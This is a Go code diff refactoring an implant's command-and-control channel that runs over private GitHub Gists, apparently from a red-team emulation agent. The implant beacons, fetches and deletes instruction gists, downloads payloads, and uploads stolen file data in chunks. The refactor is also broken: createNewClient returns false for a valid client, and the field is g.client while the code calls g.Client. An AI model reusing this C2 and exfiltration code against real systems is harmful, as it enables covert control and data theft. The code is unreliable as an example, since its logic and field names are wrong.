@@ -24,24 +24,24 @@ const (
 	gistMaxDataChunkSize = 750000 // Github GIST has max file size of 1MB. Base64-encoding 786432 bytes will hit that limit
 )
 
-var (
-	gistToken = ""
-	gistUsername string
-)
-
 type GIST struct {
 	name string
+	token string
+	username string
+	client *github.Client
 }
 
 func init() {
-	CommunicationChannels["GIST"] = GIST{ name: "GIST" }
+	CommunicationChannels["GIST"] = &GIST{
+		name: "GIST",
+	}
 }
 
 //GetInstructions sends a beacon and returns instructions
-func (g GIST) GetBeaconBytes(profile map[string]interface{}) []byte {
+func (g *GIST) GetBeaconBytes(profile map[string]interface{}) []byte {
 	checkValidSleepInterval(profile, githubTimeout, githubTimeoutResetInterval)
 	var retBytes []byte
-	bites, heartbeat := gistBeacon(profile)
+	bites, heartbeat := g.gistBeacon(profile)
 	if heartbeat == true {
 		retBytes = bites
 	}
@@ -49,14 +49,14 @@ func (g GIST) GetBeaconBytes(profile map[string]interface{}) []byte {
 }
 
 //GetPayloadBytes load payload bytes from github
-func (g GIST) GetPayloadBytes(profile map[string]interface{}, payloadName string) ([]byte, string) {
+func (g *GIST) GetPayloadBytes(profile map[string]interface{}, payloadName string) ([]byte, string) {
 	var payloadBytes []byte
 	var err error
 	if _, ok := profile["paw"]; !ok {
 		output.VerbosePrint("[!] Error obtaining payload - profile missing paw.")
 		return nil, ""
 	}
-	payloads := getGists("payloads", fmt.Sprintf("%s-%s", profile["paw"].(string), payloadName))
+	payloads := g.getGists("payloads", fmt.Sprintf("%s-%s", profile["paw"].(string), payloadName))
 	if payloads[0] != "" {
 		payloadBytes, err = base64.StdEncoding.DecodeString(payloads[0])
 		if err != nil {
@@ -68,39 +68,39 @@ func (g GIST) GetPayloadBytes(profile map[string]interface{}, payloadName string
 }
 
 //C2RequirementsMet determines if sandcat can use the selected comm channel
-func (g GIST) C2RequirementsMet(profile map[string]interface{}, criteria map[string]string) (bool, map[string]string) {
+func (g *GIST) C2RequirementsMet(profile map[string]interface{}, criteria map[string]string) (bool, map[string]string) {
     config := make(map[string]string)
     if len(criteria["c2Key"]) > 0 {
-        gistToken = criteria["c2Key"]
+        g.token = criteria["c2Key"]
         if len(profile["paw"].(string)) == 0 {
         	config["paw"] = getRandomIdentifier()
         }
-        return true, config
+        return g.createNewClient(), config
     }
     return false, nil
 }
 
-func (g GIST) SetUpstreamDestAddr(upstreamDestAddr string) {
+func (g *GIST) SetUpstreamDestAddr(upstreamDestAddr string) {
 	// Upstream destination will be the github API.
 	return
 }
 
 //SendExecutionResults send results to the server
-func (g GIST) SendExecutionResults(profile map[string]interface{}, result map[string]interface{}){
+func (g *GIST) SendExecutionResults(profile map[string]interface{}, result map[string]interface{}){
 	profileCopy := make(map[string]interface{})
 	for k,v := range profile {
 		profileCopy[k] = v
 	}
 	results := [1]map[string]interface{}{result}
 	profileCopy["results"] = results
-	gistResults(profileCopy)
+	g.gistResults(profileCopy)
 }
 
-func (g GIST) GetName() string {
+func (g *GIST) GetName() string {
 	return g.name
 }
 
-func (g GIST) UploadFileBytes(profile map[string]interface{}, uploadName string, data []byte) error {
+func (g *GIST) UploadFileBytes(profile map[string]interface{}, uploadName string, data []byte) error {
 	encodedFilename := base64.StdEncoding.EncodeToString([]byte(uploadName))
 	paw := profile["paw"].(string)
 
@@ -117,7 +117,7 @@ func (g GIST) UploadFileBytes(profile map[string]interface{}, uploadName string,
 		}
 		chunk := data[start:end]
 		gistDescription := getGistDescriptionForUpload(uploadId, encodedFilename, i+1, numChunks)
-		if err := uploadFileChunkGist(gistName, gistDescription, chunk); err != nil {
+		if err := g.uploadFileChunkGist(gistName, gistDescription, chunk); err != nil {
 			return err
 		}
 		start += gistMaxDataChunkSize
@@ -133,20 +133,20 @@ func getGistDescriptionForUpload(uploadId string, encodedFilename string, chunkN
 	return fmt.Sprintf("upload:%s:%s:%d:%d", uploadId, encodedFilename, chunkNum, totalChunks)
 }
 
-func uploadFileChunkGist(gistName string, gistDescription string, data []byte) error {
-	if result := createGist(gistName, gistDescription, data); result != created {
+func (g *GIST) uploadFileChunkGist(gistName string, gistDescription string, data []byte) error {
+	if result := g.createGist(gistName, gistDescription, data); result != created {
 		return errors.New(fmt.Sprintf("Failed to create file upload GIST. Response code: %d", result))
 	}
 	return nil
 }
 
-func gistBeacon(profile map[string]interface{}) ([]byte, bool) {
+func (g *GIST) gistBeacon(profile map[string]interface{}) ([]byte, bool) {
 	failCount := 0
-	heartbeat := createHeartbeatGist("beacon", profile)
+	heartbeat := g.createHeartbeatGist("beacon", profile)
 	if heartbeat {
 		//collect instructions & delete
 		for failCount < gistBeaconResponseFailThreshold {
-			contents := getGists("instructions", profile["paw"].(string));
+			contents := g.getGists("instructions", profile["paw"].(string));
 			if contents != nil {
 				decodedContents, err := base64.StdEncoding.DecodeString(contents[0])
 				if err != nil {
@@ -164,7 +164,7 @@ func gistBeacon(profile map[string]interface{}) ([]byte, bool) {
 	return nil, heartbeat
 }
 
-func createHeartbeatGist(gistType string, profile map[string]interface{}) bool {
+func (g *GIST) createHeartbeatGist(gistType string, profile map[string]interface{}) bool {
 	data, err := json.Marshal(profile)
 	if err != nil {
 		output.VerbosePrint(fmt.Sprintf("[-] Cannot create Gist heartbeat. Error with profile marshal: %s", err.Error()))
@@ -174,7 +174,7 @@ func createHeartbeatGist(gistType string, profile map[string]interface{}) bool {
 		paw := profile["paw"].(string)
 		gistName := getDescriptor(gistType, paw)
 		gistDescription := gistName
-		if createGist(gistName, gistDescription, data) != created {
+		if g.createGist(gistName, gistDescription, data) != created {
 			output.VerbosePrint("[-] Heartbeat GIST: FAILED")
 			return false
 		}
@@ -183,7 +183,7 @@ func createHeartbeatGist(gistType string, profile map[string]interface{}) bool {
 	return true
 }
 
-func gistResults(result map[string]interface{}) {
+func (g *GIST) gistResults(result map[string]interface{}) {
 	data, err := json.Marshal(result)
 	if err != nil {
 		output.VerbosePrint(fmt.Sprintf("[-] Cannot create Gist results. Error with result marshal: %s", err.Error()))
@@ -192,7 +192,7 @@ func gistResults(result map[string]interface{}) {
 		paw := result["paw"].(string)
 		gistName := getDescriptor("results", paw)
 		gistDescription := gistName
-		if createGist(gistName, gistDescription, data) != created {
+		if g.createGist(gistName, gistDescription, data) != created {
 			output.VerbosePrint("[-] Results GIST: FAILED")
 		} else {
 			output.VerbosePrint("[+] Results GIST: SUCCESS")
@@ -201,16 +201,15 @@ func gistResults(result map[string]interface{}) {
 }
 
 
-func createGist(gistName string, description string, data []byte) int {
+func (g *GIST) createGist(gistName string, description string, data []byte) int {
 	ctx := context.Background()
-	c2Client := createNewClient()
 	stringified := base64.StdEncoding.EncodeToString(data)
 	file := github.GistFile{Content: &stringified,}
 	files := make(map[github.GistFilename]github.GistFile)
 	files[github.GistFilename(gistName)] = file
 	public := false
 	gist := github.Gist{Description: &description, Public: &public, Files: files,}
-	_, resp, err := c2Client.Gists.Create(ctx, &gist)
+	_, resp, err := g.Client.Gists.Create(ctx, &gist)
 	if err != nil {
 		output.VerbosePrint(fmt.Sprintf("[!] Error creating GIST: %s", err.Error()))
 		return githubError
@@ -218,33 +217,36 @@ func createGist(gistName string, description string, data []byte) int {
 	return resp.StatusCode
 }
 
-func getGists(gistType string, uniqueID string) []string {
+func (g *GIST) getGists(gistType string, uniqueID string) []string {
 	ctx := context.Background()
-	c2Client := createNewClient()
 	var contents []string
-	gists, _, err := c2Client.Gists.List(ctx, gistUsername, nil)
+	gists, _, err := g.Client.Gists.List(ctx, g.username, nil)
 	if err == nil {
 		for _, gist := range gists {
 			if !*gist.Public && (*gist.Description == getDescriptor(gistType, uniqueID)) {
-				fullGist, _, err := c2Client.Gists.Get(ctx, gist.GetID())
+				fullGist, _, err := g.Client.Gists.Get(ctx, gist.GetID())
 				if err == nil {
 					for _, file := range fullGist.Files {
 						contents = append(contents, *file.Content)
 					}
 				}
-				c2Client.Gists.Delete(ctx, fullGist.GetID())
+				g.Client.Gists.Delete(ctx, fullGist.GetID())
 			}
 		}
 	}
 	return contents
 }
 
-func createNewClient() *github.Client {
+func (g *GIST) createNewClient() bool {
 	ctx := context.Background()
 	ts := oauth2.StaticTokenSource(
-		&oauth2.Token{AccessToken: gistToken},
+		&oauth2.Token{AccessToken: g.token},
 	)
 	tc := oauth2.NewClient(ctx, ts)
-	c2Client := github.NewClient(tc)
-	return c2Client
+	client := github.NewClient(tc)
+	if client != nil {
+		return false
+	}
+	g.client = client
+	return true
 }
